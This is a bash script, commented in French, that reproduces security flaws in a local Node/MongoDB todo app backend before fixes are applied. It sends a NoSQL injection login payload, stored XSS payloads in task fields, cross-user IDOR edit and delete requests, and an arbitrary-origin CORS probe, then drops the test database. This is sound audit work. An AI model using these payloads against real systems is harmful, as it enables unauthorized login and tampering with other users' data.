#!/usr/bin/env bash
# Reproduction des bugs et failles sur le code d'ORIGINE (avant correctifs)
cd "C:/Users/CCasa/Downloads/exam_practice_app_clean/exam_practice_app_clean/backend" || exit 1
node server.js > "$SCRATCH/backend-original.log" 2>&1 &
NODE_PID=$!
for i in $(seq 1 20); do curl -s -o /dev/null http://localhost:5000/api/tasks && break; sleep 1; done
BASE=http://localhost:5000/api
J='Content-Type: application/json'
echo "### 1. En-têtes de réponse + CORS avec une Origin arbitraire"
curl -s -D - -o /dev/null -H "Origin: http://site-malveillant.example" "$BASE/tasks"
echo; echo "### 2. Inscription avec identifiants faibles (username 'a', mot de passe '1')"
curl -s -X POST "$BASE/auth/register" -H "$J" -d '{"username":"a","password":"1"}' -w "\nHTTP %{http_code}\n"
echo; echo "### 3. Injection NoSQL au login : username = {\"\$gt\":\"\"} (sans connaître le nom d'utilisateur)"
curl -s -X POST "$BASE/auth/login" -H "$J" -d '{"username":{"$gt":""},"password":"1"}' -w "\nHTTP %{http_code}\n"
echo; echo "### 4. Création de deux utilisateurs alice_repro et bob_repro"
TOKEN_A=$(curl -s -X POST "$BASE/auth/register" -H "$J" -d '{"username":"alice_repro","password":"motdepasse"}' | sed -E 's/.*"token":"([^"]+)".*/\1/')
TOKEN_B=$(curl -s -X POST "$BASE/auth/register" -H "$J" -d '{"username":"bob_repro","password":"motdepasse"}' | sed -E 's/.*"token":"([^"]+)".*/\1/')
echo "alice: ${TOKEN_A:0:20}...  bob: ${TOKEN_B:0:20}..."
echo; echo "### 5. Token invalide : quel code HTTP ?"
curl -s "$BASE/tasks" -H "x-auth-token: faux.token.invalide" -w "\nHTTP %{http_code}\n"
echo; echo "### 6. Tâche sans titre (équivalent formulaire vide) : quel code HTTP ?"
curl -s -X POST "$BASE/tasks" -H "$J" -H "x-auth-token: $TOKEN_A" -d '{}' -w "\nHTTP %{http_code}\n"
echo; echo "### 7. Titre et description contenant du HTML/JS (XSS stocké)"
curl -s -X POST "$BASE/tasks" -H "$J" -H "x-auth-token: $TOKEN_A" -d '{"title":"<script>alert(\"test\")</script>","description":"<img src=x onerror=alert(1)>"}' -w "\nHTTP %{http_code}\n"
echo; echo "### 8. alice crée une tâche privée"
TASK=$(curl -s -X POST "$BASE/tasks" -H "$J" -H "x-auth-token: $TOKEN_A" -d '{"title":"Tache privee d alice"}')
echo "$TASK"
TASK_ID=$(echo "$TASK" | sed -E 's/.*"_id":"([^"]+)".*/\1/')
echo; echo "### 9. IDOR : bob modifie la tâche d'alice ($TASK_ID)"
curl -s -X PUT "$BASE/tasks/$TASK_ID" -H "$J" -H "x-auth-token: $TOKEN_B" -d '{"title":"Modifiee par bob","isCompleted":true}' -w "\nHTTP %{http_code}\n"
echo; echo "### 10. IDOR : bob supprime la tâche d'alice"
curl -s -X DELETE "$BASE/tasks/$TASK_ID" -H "x-auth-token: $TOKEN_B" -w "\nHTTP %{http_code}\n"
echo; echo "### 11. Ce qu'il reste à alice"
curl -s "$BASE/tasks" -H "x-auth-token: $TOKEN_A" -w "\nHTTP %{http_code}\n"
echo; echo "### 12. Identifiant de tâche mal formé"
curl -s -X DELETE "$BASE/tasks/abc" -H "x-auth-token: $TOKEN_B" -w "\nHTTP %{http_code}\n"
echo; echo "### 13. Route inexistante"
curl -s "$BASE/inexistante" -w "\nHTTP %{http_code}\n" | head -c 300; echo
echo; echo "### 14. Journal serveur (console.log brut)"
kill $NODE_PID 2>/dev/null; sleep 1
cat "$SCRATCH/backend-original.log"
echo; echo "### 15. Nettoyage de la base de reproduction"
docker exec todo-mongo mongosh --quiet --eval 'db.getSiblingDB("exam_practice_db").dropDatabase().ok'
